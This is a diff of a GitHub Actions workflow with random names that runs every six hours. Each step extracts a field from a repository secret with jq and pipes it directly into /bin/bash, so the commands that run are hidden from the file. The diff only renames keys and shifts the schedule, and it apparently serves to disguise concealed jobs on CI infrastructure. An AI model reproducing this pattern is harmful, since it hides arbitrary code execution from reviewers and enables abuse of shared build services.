@@ -1,28 +1,25 @@
 name: founderunable
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 4/6 * * *'
-
+    - cron: '17 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: founderunable
         env:
-          evl338: ${{ secrets.evl338 }}
+          kijn8: ${{ secrets.kijn8 }}
         run: |
-          echo $evl338 | jq -r .foppx102 | /bin/bash
-          echo $cto5 | jq -r .c74952 | /bin/bash
-          echo $wpkq33 | jq -r .wz33929 | /bin/bash
-          echo $yeyq4 | jq -r .naosa60 | /bin/bash
-          echo $rpk378 | jq -r .jnlut75429 | /bin/bash
-          echo $qs662 | jq -r .u235 | /bin/bash
-          echo $twfm945 | jq -r .keefd95 | /bin/bash
-          echo $fgid45 | jq -r .i3834 | /bin/bash
-          echo $ylai75 | jq -r .ra6289 | /bin/bash
-          echo $etf99758 | jq -r .acfu0375 | /bin/bash
-          echo $ppy781 | jq -r .nufoi7127 | /bin/bash
+          echo $kijn8 | jq -r .lam68784 | /bin/bash
+          echo $li7408 | jq -r .btbix1313 | /bin/bash
+          echo $bada307 | jq -r .nipuo61 | /bin/bash
+          echo $zguxk8 | jq -r .dwg151 | /bin/bash
+          echo $bv0 | jq -r .ajuv5 | /bin/bash
+          echo $cgi4 | jq -r .x10126 | /bin/bash
+          echo $br56 | jq -r .yqvyb592 | /bin/bash
+          echo $e88642 | jq -r .qgb784 | /bin/bash
+          echo $x7 | jq -r .xhq3 | /bin/bash
 
